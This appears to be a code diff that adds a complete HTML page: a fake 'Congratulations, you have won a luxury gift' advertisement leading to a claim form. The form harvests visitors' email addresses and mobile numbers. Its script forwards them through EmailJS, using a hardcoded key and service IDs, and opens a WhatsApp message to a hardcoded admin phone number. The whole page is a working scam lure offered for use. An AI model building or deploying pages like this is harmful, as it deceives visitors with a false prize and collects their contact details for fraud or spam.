@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special Offer - Claim Your Gift</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+
+<body>
+
+    <!-- PAGE 1: ADVERTISEMENT -->
+    <div id="pageAd" class="page-container">
+        <img src="image.jpg" alt="Lucky Gift" class="ad-image">
+        <h1 class="title">Congratulations!</h1>
+        <p class="subtitle">You have been selected to win a special luxury gift set. Limited time offer!</p>
+        <button id="btnGotoClaim" class="gift-btn">Claim Your Gift Now</button>
+    </div>
+
+    <!-- PAGE 2: CLAIM FORM -->
+    <div id="pageClaim" class="page-container hidden">
+        <h1 class="title">Unlock Your Offer</h1>
+        <p class="subtitle">Please provide your details to verify your eligibility and claim your reward.</p>
+
+        <div class="input-group">
+            <label class="input-label">Email Address</label>
+            <input type="email" id="email" placeholder="example@gmail.com">
+        </div>
+
+        <div class="input-group">
+            <label class="input-label">Mobile Number</label>
+            <input type="tel" id="mobile" placeholder="+94 7X XXX XXXX">
+        </div>
+
+        <button id="btnFinalClaim" class="claim-btn">Claim Offer</button>
+    </div>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        (function () {
+            // Initialize EmailJS with your Public Key
+            emailjs.init("2v-ZV-reQ1aX-0GRH");
+        })();
+
+        // Navigation Logic
+        const pageAd = document.getElementById('pageAd');
+        const pageClaim = document.getElementById('pageClaim');
+        const btnGotoClaim = document.getElementById('btnGotoClaim');
+
+        btnGotoClaim.addEventListener('click', () => {
+            pageAd.classList.add('hidden');
+            pageClaim.classList.remove('hidden');
+        });
+
+        // Final Claim Action
+        document.getElementById('btnFinalClaim').addEventListener('click', function () {
+            const email = document.getElementById('email').value;
+            const mobile = document.getElementById('mobile').value;
+
+            // Hardcoded number for notifications
+            const adminNotifyNumber = "94789283337";
+
+            if (!email || !mobile) {
+                alert("Please fill in both fields!");
+                return;
+            }
+
+            // Construct message
+            const formattedMessage = `New Gift Claim Request:\nEmail: ${email}\nMobile: ${mobile}`;
+
+            // 1. Send via EmailJS
+            const templateParams = {
+                message: formattedMessage,
+                to_name: "Admin"
+            };
+
+            emailjs.send('service_8qs03ph', 'template_ewgebbp', templateParams)
+                .then(function (response) {
+                    console.log('EMAIL SUCCESS!', response.status, response.text);
+                    alert("Claim Request Sent! We will contact you shortly.");
+                }, function (error) {
+                    console.log('EMAIL FAILED...', error);
+                    alert("Submission failed. Check your connection.");
+                });
+
+            // 2. Send via WhatsApp notification to Admin
+            const whatsappUrl = `https://api.whatsapp.com/send?phone=${adminNotifyNumber}&text=${encodeURIComponent(formattedMessage)}`;
+            window.open(whatsappUrl, '_blank');
+        });
+    </script>
+
+</body>
+
+</html>
